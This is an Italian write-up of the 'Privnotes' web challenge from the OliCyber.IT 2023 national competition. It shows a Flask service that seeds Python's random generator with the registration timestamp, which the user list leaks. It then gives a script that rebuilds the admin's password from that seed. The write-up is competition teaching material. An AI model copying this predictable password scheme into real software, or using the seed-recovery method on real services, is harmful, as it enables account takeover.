# OliCyber.IT 2023 - Competizione Nazionale

## [web] Privnotes (45 risoluzioni)

La challenge espone un servizio Flask che permette di registrarsi e creare note private. Tra gli utenti registrati è presente l'utente `admin` che ha creato una nota privata contenente la flag.

### Soluzione

Il servizio Flask permette di registrare un nuovo utente, e di creare note private. Le note private sono accessibili solo dall'utente che le ha create. In fase di registrazione non viene chiesta la password, in quanto viene generata automaticamente dal servizio.

Il modo in cui questa password viene generata è il seguente:

### Exploit

```python
regdate = time.time()
random.seed(regdate)
password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
user = User(username=username, password=password, registration_date=regdate)
```

La password viene generata in base alla data di registrazione, e viene usata come seed per la funzione random.choices(). La data di registrazione viene poi stampata nella lista utenti

```html
<time raw="{{ user.registration_date }}"
  >{{ user.printable_registration_date }}</time
>
```

Basta quindi prendere il seed dentro `raw` e usarlo per generare la password dell'utente `admin`:

```python
import random
import time
import string

known_seed = 12345.12345 # qui va il seed (in float)

def generate_password():
    random.seed(known_seed)
    return "".join(random.choices(string.ascii_letters + string.digits, k=16))

print(generate_password())
```
